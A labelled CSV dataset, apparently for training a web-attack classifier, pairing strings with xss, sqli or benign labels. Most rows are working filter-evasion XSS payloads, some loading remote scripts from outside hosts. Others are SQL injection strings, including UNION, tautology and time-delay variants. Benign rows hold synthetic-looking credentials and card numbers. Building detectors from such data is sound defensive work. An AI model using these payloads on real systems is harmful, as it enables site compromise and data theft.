payload,type
"`""'><img src=xxx:x onerror\x0D=javascript:alert(1)>",xss
<script x> alert(1) </script 1=2,xss
a'or/*d*/345=345--,sqli
"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",xss
"s{UEs: select * from users where id=1 or 1#""{ union select 'a',version() -- 1",sqli
<img src ?itworksonchrome?\/onerror = alert(1)​​​,xss
s&on&: select * from users where id='1' or \<$ or 1=1 -- 1',sqli
"<event-source src=""%(event)s"" onload=""javascript:alert(1)"">",xss
"s?;s: select * from users where id=1 or ""?;"" or 1=1 -- 1",sqli
imagenes/2.gif,benign
"s:UEs: select * from users where id=1 or 1#"": union select 'a',version() -- 1",sqli
9869,benign
"UE1s: select * from users where id=1 union select 1 $$,version() -- 1",sqli
"sv?s: select * from users where id=1 or ""@?"" or 1=1 -- 1",sqli
"a"" or ""345""=""345",sqli
"ABC<div style=""x:\xE2\x80\x8Bexpression(javascript:alert(1)"">DEF",xss
"<bgsound onPropertyChange bgsound onPropertyChange=""javascript:javascript:alert(1)""></bgsound onPropertyChange>",xss
publico/vaciar.jsp?B2=Vaciar+carrito,benign
o.&1c: select * from users where id=1 <@. or 1=1 -- 1,sqli
"sn{s: select * from users where id=1 or ""_{"" or 1=1 -- 1",sqli
global/titulo.jsp,benign
"sUEnv: select * from users where id='1' union select $*$,@@VERSION -- 1'",sqli
"1o)UE: select * from users where id=1 + (\+) union select null,@@VERSION -- 1",sqli
"s;ns: select * from users where id=1 or "";_"" or 1=1 -- 1",sqli
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:javascript:alert(1);"">",xss
8.22E+15,benign
"`""'><img src=xxx:x \x0Aonerror=javascript:alert(1)>",xss
4s2cu8e44,benign
cotner,benign
&o.&1: select * from users where id=1 or \<\. or 1=1 -- 1,sqli
"s&(1): select * from users where id='1' or (1)=1 union select 1,banner from v$version where rownum=1 -- 1'",sqli
<video poster=javascript:javascript:alert(1)//,xss
o(v)&: select * from users where id=1 %(@) or 1=1 -- 1,sqli
"<img\x47src=x onerror=""javascript:alert(1)"">",xss
miembros/index.jsp,benign
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",xss
"1o.UE: select * from users where id=1 +\+. union select null,@@VERSION -- 1",sqli
http://www.<script>alert(1)</script .com,xss
<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->,xss
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
"""`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>",xss
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>,xss
"s:)s: select * from users where id=1 or "":)""=1 or 1=1 -- 1",sqli
"<img \x47src=x onerror=""javascript:alert(1)"">",xss
a' or 'dfth'='dfth'--,sqli
"<a href=""\xE2\x80\x89javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<img src=x onerror=\x09""javascript:alert(1)"">",xss
"1')) or benchmark(100000000,MD5(1))#",sqli
swearing,benign
"<div style=""list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));"">X",xss
"o.UEf: select * from users where id=1  <@. union select version(),version() -- 1",sqli
"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",xss
"ABC<div style=""x:\xE2\x80\x86expression(javascript:alert(1)"">DEF",xss
"<svg onResize svg onResize=""javascript:javascript:alert(1)""></svg onResize>",xss
capaz9,benign
"<IMG SRC=""livescript:[code]"">",xss
"<a style=""-o-link:'javascript:javascript:alert(1)';-o-link-source:current"">X",xss
"sUEo1: select * from users where id='1' union select !<1,version() -- 1'",sqli
dagmar,benign
"s:v: select * from users where id=1 or "":@"" or 1=1 -- 1",sqli
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
"so()U: select * from users where id='1' + (\) union select 1,@@VERSION -- 1'",sqli
"ABC<div style=""x:exp\x5Cression(javascript:alert(1)"">DEF",xss
"s?o1U: select * from users where id=1 or 1#""?=1 union select 1,version() -- 1",sqli
"UEvf(: select * from users where id=1 union select @<@$,version() -- 1",sqli
"`""'><img src=xxx:x \x22onerror=javascript:alert(1)>",xss
"<IMG SRC=# onmouseover=""alert('xxs')"">",xss
"""`'><script>\xE1\x9A\x80javascript:alert(1)</script>",xss
"<meta charset=""x-imap4-modified-utf7"">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi",xss
<script>javascript:alert(1)</script\x0A,xss
"""`'><script>\xE2\x80\x89javascript:alert(1)</script>",xss
1; waitfor delay '0:0:X'--,sqli
imagenes/1.gif,benign
"<iframe srcdoc=""&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>"">",xss
patchsqa,benign
miembros/imagenes/zarauz.jpg,benign
"noUEv: select * from users where id=1 +$+ union select null,@@VERSION -- 1",sqli
<!--[if<img src=x onerror=javascript:alert(1)//]> -->,xss
"<XSS STYLE=""behavior: url(%(htc)s);"">",xss
"</ foo=""><script>javascript:alert(1)</script>"">",xss
imagenes/logo.gif,benign
5150,benign
"&noUE: select * from users where id=1 or $<\ union select 1,@@VERSION -- 1",sqli
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\,xss
"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",xss
"&1UE1: select * from users where id=1 ||1 union select 1,banner from v$version where rownum=1 -- 1",sqli
"<div style=""font-family:'foo&#10;;color:red;';"">XXX",xss
".ovUE: select * from users where id=1.%@ union select 1,version() -- 1",sqli
"<div style=""background:url(/f#&#127;oo/;color:red/*/foo.jpg);"">X",xss
"s(n: select * from users where id=1 or ""(["" or 1=1 -- 1",sqli
publico/registro.jsp?modo=registro&login=haralamb&password=PO2546OtO4&nombre=Amancio&apellidos=Daya+Basulto&email=gila-berova%40artforall.mm&dni=06314426Y&direccion=C%2F+Plza.+18%2C+6-E&ciudad=Chimillas&cp=19144&provincia=C%E1ceres&ntc=6002328199807748&B1=Registrar,benign
a' or '345'='345,sqli
miembros/salir.jsp,benign
"<a href=""\xE1\xA0\x8Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/miembros.jsp,benign
miembros/fotos.jsp,benign
index.jsp,benign
"sUEo\: select * from users where id='1' union select +\#,@@VERSION -- 1'",sqli
"""`'><script>\x0Cjavascript:alert(1)</script>",xss
wanda,benign
"ABC<div style=""x:\xE3\x80\x80expression(javascript:alert(1)"">DEF",xss
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/,xss
"ABC<div style=""x:exp\x00ression(javascript:alert(1)"">DEF",xss
"s{o1&: select * from users where id=1 or @#""{=1 or 1=1 -- 1",sqli
"&.onU: select * from users where id=1 or \.<$ union select 1,@@VERSION -- 1",sqli
1437,benign
"s:1s: select * from users where id=1 or "":1"" or 1=1 -- 1",sqli
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',xss
"""`'><script>\xE2\x80\xAFjavascript:alert(1)</script>",xss
"`""'><img src=xxx:x onerror\x09=javascript:alert(1)>",xss
<iframe src=http://ha.ckers.org/scriptlet.html <,xss
imagenes/logo.gif,benign
"ABC<div style=""x:\x0Bexpression(javascript:alert(1)"">DEF",xss
"s?&1c: select * from users where id=1 or 1#""? or 1=1 -- 1",sqli
"<IMG SRC=""javascript:alert('XSS');"">",xss
"&v: select * from users where id=1 or @`\` union select 1,version() -- 1",sqli
48042322z,benign
"s;n: select * from users where id=1 or "";["" or 1=1 -- 1",sqli
"&o1UE: select * from users where id=1 or \<1 union select 1,@@VERSION -- 1",sqli
publico/caracteristicas.jsp?id=1,benign
"n1UEv: select * from users where id=1 +$ 1 union select null,@@VERSION -- 1",sqli
"s&noo: select * from users where id='1' or $+<$ union select 1,@@VERSION -- 1'",sqli
"s.c: select * from users where id=1 or "".#"" or 1=1 -- 1",sqli
publico/caracteristicas.jsp?id=2,benign
--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
karlweiss@barnicesuv.gov,benign
<BODY ONLOAD=javascript:alert(1)>,xss
"s?,vc: select * from users where id='1' union select $[""],@@VERSION -- 1'",sqli
1oo1&: select * from users where id=1 + \+%1 or 1=1 -- 1,sqli
hao,benign
publico/miembros.jsp,benign
6660,benign
"s?UEv: select * from users where id=1 or 1#""? union select null,version() -- 1",sqli
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>,xss
guadiana 149 6f,benign
"<embed src=""javascript:alert(1)"">",xss
"<img src=1 href=1 onerror=""javascript:alert(1)""></img>",xss
"<IMG SRC=""javascript:javascript:alert(1);"">",xss
<script language='javascript' src='%(jscript)s'></script>,xss
"<img src\x00=x onerror=""javascript:alert(1)"">",xss
<script\x20>javascript:alert(1)</script>,xss
.o1&1: select * from users where id=1.*1 or 1=1 -- 1,sqli
miembros/fotos.jsp,benign
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",xss
"admin"" or ""1""=""1""#",sqli
"<html onMouseLeave html onMouseLeave=""javascript:javascript:alert(1)""></html onMouseLeave>",xss
"<a/href=""javascript:&#13; javascript:prompt(1)""><input type=""X"">",xss
miembros/index.jsp,benign
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss
"snUE1: select * from users where id=1 or 1#""$ union select 1,version() -- 1",sqli
"""`'><script>\xE2\x80\x82javascript:alert(1)</script>",xss
sevilla,benign
a' order by 1-- #,sqli
c/ arco de veronicas s/n 4e,benign
"'`""><\x00script>javascript:alert(1)</script>",xss
publico/pagar.jsp?modo=insertar&precio=7537&B1=Confirmar,benign
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",xss
"<a href=""javas\x02cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"ABC<div style=""x:\x00expression(javascript:alert(1)"">DEF",xss
dalmau,benign
imagenes/cmenbul.gif,benign
"&1oo1: select * from users where id=1 or  1<@=1 union select 1,version() -- 1",sqli
"<img src=x\x13onerror=""javascript:alert(1)"">",xss
casasola de arin,benign
miembros/index.jsp,benign
6477,benign
&,sqli
<svg/onload=alert(1),xss
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera},xss
"<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]<![CDATA[cript:javascript:alert(1);"">]]</C><X></xml>",xss
"sUE.o: select * from users where id='1' union select \.%1,@@VERSION -- 1'",sqli
publico/registro.jsp?modo=registro&login=blanchet&password=recital&nombre=Filem%F3n&apellidos=Ditte+Pallar%E8s&email=moston%40sierradealcaraz.sg&dni=21096784B&direccion=Calle+Miquel+Santandreu+66%2C+&ciudad=Valderredible&cp=04878&provincia=Le%F3n&ntc=1764884801392734&B1=Registrar,benign
miembros/fotos.jsp,benign
"s),s: select * from users where id=1 or ""),"" or 1=1 -- 1",sqli
ribamontn al mar,benign
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>,xss
"""`'><script>\xE2\x80\x80javascript:alert(1)</script>",xss
"s,o1&: select * from users where id=1 or 1#"",=1 or 1=1 -- 1",sqli
"guardia, la",benign
"<html onMouseOut html onMouseOut=""javascript:javascript:alert(1)""></html onMouseOut>",xss
<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>,xss
19140,benign
"so.nU: select * from users where id='1' <@._ union select 1,version() -- 1'",sqli
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",xss
"<script src=""data:\xCB\x8F,javascript:alert(1)""></script>",xss
index.jsp,benign
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera},xss
"&1ooU: select * from users where id=1 or \+<\ union select 1,@@VERSION -- 1",sqli
"""/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />",xss
"admin""/*",sqli
"<style><img src=""</style><img src=x onerror=javascript:alert(1)//"">",xss
global/menum.jsp,benign
".o.UE: select * from users where id=1.<@. union select 1,version() -- 1",sqli
publico/carrito.jsp,benign
"s: select * from users where id='1' or """"<@ union select 1,version() -- 1'",sqli
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",xss
"<a href=""\xE2\x80\x8Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"UE1&1: select * from users where id=1 union select 1||1,version() -- 1",sqli
imagenes/cmenbul.gif,benign
"<a href=""\x08javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
<svg><script onlypossibleinopera:-)> alert(1),xss
"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",xss
global/menum.jsp,benign
imagenes/2.gif,benign
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:javascript:alert(1);"">",xss
"UEvs: select * from users where id=1 union select @ $$,version() -- 1",sqli
"sovvU: select * from users where id='1' + @ @1 union select 1,version() -- 1'",sqli
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser,xss
"no.UE: select * from users where id=1 +$+. union select null,@@VERSION -- 1",sqli
"<a href=""\x15javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"s&v1U: select * from users where id='1' or @ 1=1 union select 1,version() -- 1'",sqli
"<math href=""javascript:javascript:alert(1)"">CLICKME</math>  <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>",xss
28221877a,benign
' or ''-',sqli
"UE1nc: select * from users where id=1 union select 1a#,banner from v$version where rownum=1 -- 1",sqli
admin' #,sqli
"<a href=""\xC2\xA0javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"""`'><script>\xE2\x80\x88javascript:alert(1)</script>",xss
admin' --,sqli
tenuta,benign
"<BGSOUND SRC=""javascript:alert('XSS');"">",xss
"s(UEf: select * from users where id=1 or 1#""( union select version(),version() -- 1",sqli
"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",xss
<IMG SRC=&{javascript:alert(1);};>,xss
"<script charset=""\x22>javascript:alert(1)</script>",xss
"&ovUE: select * from users where id=1 or !<@ union select 1,version() -- 1",sqli
"<INPUT TYPE=""IMAGE"" SRC=""javascript:javascript:alert(1);"">",xss
"`""'><img src=xxx:x \x00onerror=javascript:alert(1)>",xss
"<script onLoad script onLoad=""javascript:javascript:alert(1)""></script onLoad>",xss
"<img src=x onerror=\x00""javascript:alert(1)"">",xss
"s.?s: select * from users where id=1 or "".]"" or 1=1 -- 1",sqli
"<embed width=500 height=500 code=""data:text/html,<script>%(payload)s</script>""></embed>",xss
"<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",xss
"<script src=""data:\xD4\x8F,javascript:alert(1)""></script>",xss
"<a href=""\x13javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>​",xss
"<html onMouseDown html onMouseDown=""javascript:javascript:alert(1)""></html onMouseDown>",xss
"<img \x00src=x onerror=""alert(1)"">",xss
miembros/editar.jsp?modo=registro&login=padraic&password=-se331rio&nombre=Yuvia&apellidos=Escogido+Francesc&email=challee%40zonamodelos.co&dni=02933716C&direccion=Cami+Son+Anglada%2C+S%2FN+&ciudad=Lagata&cp=31382&provincia=Navarra&ntc=0777026292170424&B1=Registrar,benign
glyn7,benign
"<iframe src iframe src=""javascript:javascript:alert(1)""></iframe src>",xss
"<a href=""javascript\x3Ajavascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
imagenes/nuestratierra.jpg,benign
s&n1&: select * from users where id='1' or $ 1=1 or 1=1 -- 1',sqli
onn&1: select * from users where id=1 <@$_ or 1=1 -- 1,sqli
"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",xss
lamarr@tardos.mobi,benign
publico/miembros.jsp,benign
<style onreadystatechange=javascript:javascript:alert(1);></style>,xss
"<A HREF=""http://1113982867/"">XSS</A>",xss
"""`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>",xss
"s&onU: select * from users where id='1' or \<$ union select 1,@@VERSION -- 1'",sqli
publico/productos.jsp,benign
"ABC<div style=""x:\xE2\x80\x85expression(javascript:alert(1)"">DEF",xss
1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>,xss
"svc: select * from users where id=1 or ""@#"" or 1=1 -- 1",sqli
<body oninput=javascript:alert(1)><input autofocus>,xss
"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",xss
"&n1UE: select * from users where id=1 or $ 1=1 union select 1,@@VERSION -- 1",sqli
"s)(s: select * from users where id=1 or "")(""=1 or 1=1 -- 1",sqli
"&.o1U: select * from users where id=1 or \.<1 union select 1,@@VERSION -- 1",sqli
o(n)&: select * from users where id=1 %($) or 1=1 -- 1,sqli
"<svg onload svg onload=""javascript:javascript:alert(1)""></svg onload>",xss
o..&1: select * from users where id=1 <@.. or 1=1 -- 1,sqli
imagenes/cmenbul.gif,benign
admin' or 1=1/*,sqli
&(1&1: select * from users where id=1 or (\+)=1 or 1=1 -- 1,sqli
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",xss
.ov&1: select * from users where id=1.%@ or 1=1 -- 1,sqli
<frameset onload=javascript:javascript:alert(1)></frameset>,xss
carmelo,benign
"s);s: select * from users where id=1 or "");"" or 1=1 -- 1",sqli
"<div id=""x"">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>",xss
"admin"" --",sqli
revelante,benign
de_la,benign
imagenes/logo.gif,benign
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",xss
"<a href=""\x00javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1),xss
"sUE\c: select * from users where id='1' union select \#,@@VERSION -- 1'",sqli
07608453f,benign
imagenes/1.gif,benign
"&oUEv: select * from users where id=1 or \<\ union select null,@@VERSION -- 1",sqli
1'); waitfor delay '0:0:X'--,sqli
".oUEf: select * from users where id=1. <@ union select version(),version() -- 1",sqli
admin'or 1=1 or ''=',sqli
"""/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />",xss
imagenes/3.gif,benign
imagenes/1.gif,benign
publico/autenticar.jsp?modo=entrar&login=utilla&pwd=33s4h9929r&remember=off&B1=Entrar,benign
"<IMG SRC=""jav    ascript:alert('XSS');"">",xss
"<a href=""\x11javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"a""or/*g*/345=345-- #",sqli
"so:s: select * from users where id=1 or ""&:"" or 1=1 -- 1",sqli
3.40E+15,benign
a'and/*d*/456=678--,sqli
"o1c: select * from users where id=1 <1## union select 1,version() -- 1",sqli
imagenes/2.gif,benign
"<a href=""\x0Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"sov1U: select * from users where id='1' + @ 1 union select 1,version() -- 1'",sqli
"<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>",xss
soov&: select * from users where id='1' <@&@ or 1=1 -- 1',sqli
"s;?s: select * from users where id=1 or "";]"" or 1=1 -- 1",sqli
<img src=`xx:xx`onerror=alert(1)>,xss
global/creditos.jsp,benign
<IMG SRC=javascript:javascript:alert(1)>,xss
"soo1U: select * from users where id='1' <@&1 union select 1,version() -- 1'",sqli
"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
" or ""-",sqli
"UEvnn: select * from users where id=1 union select @ $_,version() -- 1",sqli
"<img \x47src=x onerror=""javascript:alert(1)"">",xss
"&(nUE: select * from users where id=1 or ($+)=1 union select 1,@@VERSION -- 1",sqli
"`""'><img src=xxx:x onerror\x0C=javascript:alert(1)>",xss
index.jsp,benign
&on&1: select * from users where id=1 or \<$ or 1=1 -- 1,sqli
prado de la guzpea,benign
" or ""^",sqli
global/creditos.jsp,benign
"a"" and ""fghi""=""fghj""-- #",sqli
"<img src=x\x10onerror=""javascript:alert(1)"">",xss
"s:,s: select * from users where id=1 or "":,"" or 1=1 -- 1",sqli
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",xss
"UEv11: select * from users where id=1 union select @ 1$,version() -- 1",sqli
"<TABLE><TD BACKGROUND=""javascript:javascript:alert(1)"">",xss
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>,xss
vital,benign
45681,benign
"1) or benchmark(100000000,MD5(1))#",sqli
"<TABLE BACKGROUND=""javascript:javascript:alert(1)"">",xss
"so)s: select * from users where id=1 or ""&)"" or 1=1 -- 1",sqli
"s&v(1: select * from users where id='1' or @(1)=1 union select 1,version() -- 1'",sqli
"ABC<div style=""x:\x0Aexpression(javascript:alert(1)"">DEF",xss
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=31&B1=A%F1adir+al+carrito,benign
' or ''&',sqli
"cami son anglada, s/n",benign
"o(1)U: select * from users where id=1 *(1) union select 1,banner from v$version where rownum=1 -- 1",sqli
"s:.s: select * from users where id=1 or "":.""=1 or 1=1 -- 1",sqli
"<object onError object onError=""javascript:javascript:alert(1)""></object onError>",xss
"<body onPageHide body onPageHide=""javascript:javascript:alert(1)""></body onPageHide>",xss
"s{(s: select * from users where id=1 or ""{(""=1 or 1=1 -- 1",sqli
oo1&1: select * from users where id=1 %!<1 or 1=1 -- 1,sqli
global/creditos.jsp,benign
imagenes/nuestratierra.jpg,benign
<input onfocus=javascript:alert(1) autofocus>,xss
"sn;s: select * from users where id=1 or ""_;"" or 1=1 -- 1",sqli
"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",xss
s&ov&: select * from users where id='1' or !<@ or 1=1 -- 1',sqli
"""`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>",xss
"<iframe onload iframe onload=""javascript:javascript:alert(1)""></iframe onload>",xss
chicon merlo,benign
"<![><img src=""]><img src=x onerror=javascript:alert(1)//"">",xss
"soovU: select * from users where id='1' %!<@ union select 1,version() -- 1'",sqli
miembros/salir.jsp,benign
imagenes/cmenbul.gif,benign
"so1s: select * from users where id=1 or ""%1"" or 1=1 -- 1",sqli
"<a href=""\x1Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/vaciar.jsp?B2=Vaciar+carrito,benign
"<P STYLE=""behavior:url('#default#time2')"" end=""0"" onEnd=""javascript:alert(1)"">",xss
"sv;s: select * from users where id=1 or ""@;""=1 or 1=1 -- 1",sqli
93289880v,benign
trobos 39 4e,benign
"s&oUE: select * from users where id='1' or \<\ union select 1,@@VERSION -- 1'",sqli
"&#00;</form><input type&#61;""date"" onfocus=""alert(1)"">",xss
"""'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>",xss
"<? foo=""><x foo='?><script>javascript:alert(1)</script>'>"">",xss
"<img \x34src=x onerror=""javascript:alert(1)"">",xss
"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",xss
.)&1c: select * from users where id=1 + (\.) or 1=1 -- 1,sqli
publico/registro.jsp?modo=registro&login=gwenny&password=BOCana%24da&nombre=Danimiro&apellidos=Prosd%F3cimo+Surinyac&email=maren-bufford4%40fruteriacartaya.yu&dni=04212893Y&direccion=C%2F+Galicia%2C+180%2C+&ciudad=Robleda&cp=06440&provincia=C%F3rdoba&ntc=1856004857366548&B1=Registrar,benign
desiree,benign
"s?UEs: select * from users where id=1 or 1#""? union select 'a',version() -- 1",sqli
"ABC<div style=""x:expression\x5C(javascript:alert(1)"">DEF",xss
"snUEf: select * from users where id=1 or 1#""$ union select version(),version() -- 1",sqli
miembros/fotos.jsp,benign
"s:;s: select * from users where id=1 or "":;""=1 or 1=1 -- 1",sqli
<script\x0A>javascript:alert(1)</script>,xss
"<iframe onLoad iframe onLoad=""javascript:javascript:alert(1)""></iframe onLoad>",xss
"UEvo.: select * from users where id=1 union select @<@.,version() -- 1",sqli
publico/productos.jsp,benign
</plaintext\></|\><plaintext/onmouseover=prompt(1),xss
"so?s: select * from users where id=1 or ""%?"" or 1=1 -- 1",sqli
